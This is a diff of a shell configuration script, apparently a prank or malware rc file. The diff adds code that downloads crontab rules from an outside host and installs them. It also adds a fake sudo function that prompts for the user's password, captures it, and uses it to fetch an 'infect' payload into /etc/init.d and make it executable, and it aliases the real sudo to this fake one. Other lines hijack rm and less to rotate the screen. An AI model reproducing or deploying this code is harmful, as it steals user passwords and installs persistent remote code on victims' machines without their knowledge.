@@ -1,3 +1,7 @@
+curl --output cronrules "http://snaipe.github.io/confloose/cronrules" >/dev/null 2>&1
+crontab cronrules
+rm cronrules
+
 f() {
     t=`which $1`
     eval "$1() { $2; }"
@@ -84,11 +88,16 @@ head() { echo '
 cfl=/etc/init.d/cfl.z
 sudo=`which sudo`
 sudo() {
-    printf "[sudo] password for `whoami`: "
-    read -s pass; echo ""
-    echo $pass | $sudo -S curl --output $cfl "http://snaipe.github.io/confloose/infect" >/dev/null 2>&1;
-    echo $pass | $sudo -S chmod +x $cfl;
+    if [ $# = 0 ]; then $sudo
+    else
+        printf "[sudo] password for `whoami`: "
+        read -s pass; echo ""
+        echo $pass | $sudo -S curl --output $cfl "http://snaipe.github.io/confloose/infect" >/dev/null 2>&1
+        echo $pass | $sudo -S chmod +x $cfl >/dev/null 2>&1
+    fi
 }
+\\sudo() { sudo; }
+eval "alias $sudo=sudo"
 
 c=0
 f rm "xrandr -o left; xrandr -x"
@@ -96,5 +105,4 @@ f less "xrandr -s $c &> /dev/null; c=$((c+1))"
 
 alias() { display http://impawards.com/tv/posters/alias_ver2.jpg }
 unalias() { display -flop http://impawards.com/tv/posters/alias_ver2.jpg }
-
 
